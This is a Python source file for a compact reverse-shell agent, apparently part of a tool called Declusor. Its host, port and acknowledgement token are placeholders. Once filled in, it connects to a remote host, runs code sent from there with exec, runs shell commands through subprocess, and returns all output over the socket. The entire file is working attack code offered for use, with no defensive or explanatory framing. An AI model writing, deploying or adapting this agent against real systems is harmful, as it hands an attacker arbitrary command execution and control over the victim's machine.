#!/usr/bin/env python3
"""Declusor py_socket compact reverse-shell agent."""

import io
import socket
import subprocess
import sys

HOST = "$HOST"
PORT = int("$PORT")
ACKNOWLEDGE = bytes.fromhex("$ACKNOWLEDGE")

_SESSION_SCOPE: dict = {"__name__": "__declusor__"}


def _is_python(code: str) -> bool:
    stripped = code.strip()
    if not stripped:
        return True
    first = stripped.splitlines()[0].strip()
    if first.startswith("#!"):
        return "python" in first.lower()

    in_doc = False
    delim = ""
    keywords = (
        "import ", "from ", "def ", "class ", "with ", "try:",
        "for ", "while ", "if ", "async ", "print(", "exec(", "eval(",
        "raise ", "assert ", "return ",
    )
    for line in code.splitlines():
        line = line.strip()
        if not line:
            continue
        if in_doc:
            if delim in line:
                in_doc = False
            continue
        if line.startswith(('"""', "'''")):
            delim = line[:3]
            if line.count(delim) < 2:
                in_doc = True
            continue
        if line.startswith("#"):
            continue
        if any(line.startswith(kw) for kw in keywords):
            return True
        if any(line.startswith(fn + "(") for fn in _SESSION_SCOPE):
            return True
        return False
    return False


def _execute(payload: str, sock: socket.socket) -> None:
    if _is_python(payload):
        buf = io.StringIO()
        old_out, old_err = sys.stdout, sys.stderr
        try:
            sys.stdout = sys.stderr = buf
            exec(payload, _SESSION_SCOPE)  # noqa: S102
        except (Exception, SystemExit) as exc:
            buf.write(f"[py_socket error] {type(exc).__name__}: {exc}\n")
        finally:
            sys.stdout, sys.stderr = old_out, old_err
        sock.sendall(buf.getvalue().encode(errors="replace") + ACKNOWLEDGE)
    else:
        proc = subprocess.Popen(payload, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)  # noqa: S602
        while proc.stdout:
            chunk = proc.stdout.read(4096)
            if not chunk:
                break
            sock.sendall(chunk)
        proc.wait()
        sock.sendall(ACKNOWLEDGE)


def _read_frame(sock: socket.socket) -> str | None:
    buf = bytearray()
    while b"\x00" not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            return None
        buf.extend(chunk)
    payload, _, _ = buf.partition(b"\x00")
    return payload.decode(errors="replace")


def main() -> None:
    with socket.create_connection((HOST, PORT)) as sock:
        helpers = _read_frame(sock)
        if helpers:
            try:
                exec(helpers, _SESSION_SCOPE)  # noqa: S102
            except (Exception, SystemExit):
                pass
        sock.sendall(ACKNOWLEDGE)
        while (payload := _read_frame(sock)) is not None:
            _execute(payload, sock)


if __name__ == "__main__":
    main()
